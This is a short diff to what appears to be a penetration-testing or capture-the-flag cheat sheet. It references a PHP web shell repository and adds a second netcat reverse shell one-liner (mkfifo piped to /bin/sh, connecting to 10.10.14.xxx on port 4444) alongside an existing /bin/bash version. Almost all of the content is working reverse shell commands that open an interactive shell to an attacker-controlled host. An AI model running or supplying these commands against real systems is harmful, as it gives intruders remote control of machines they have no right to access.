@@ -172,6 +172,10 @@ https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php
 #to launch a shell use
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.xx 666 >/tmp/f
 
+#alternate method
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.xxx 4444 >/tmp/f
+
 
 
 ##########################FIREWALL#######################
